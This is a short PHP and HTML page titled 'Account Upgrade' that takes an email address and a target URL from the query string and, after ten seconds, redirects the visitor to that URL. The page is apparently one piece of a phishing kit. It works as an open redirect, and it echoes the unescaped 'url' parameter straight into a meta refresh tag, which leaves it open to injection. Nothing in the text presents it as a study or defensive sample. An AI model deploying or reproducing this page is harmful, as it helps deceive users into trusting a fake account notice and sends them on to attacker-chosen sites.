<?
$value = $_GET['user'];
$value1 = $_GET['url'];
$cust_email = $_GET["user"];
$url = explode("@",$cust_email);
$parts = preg_split ("/[\@.]+/", $cust_email);
$cust_name = $parts[0];

?>

<html>
<head> <title>Account Upgrade</title>
<META http-equiv="refresh" content="10; url=http://<?php echo $value1; ?>">
<link rel="shortcut icon" href="images/logo.jpg" />

</head>
<body>

<center>

<img src="images/bFANBxjkx7g2E5i-QACkROOKDkQ.png">

</center>





</body>
</html>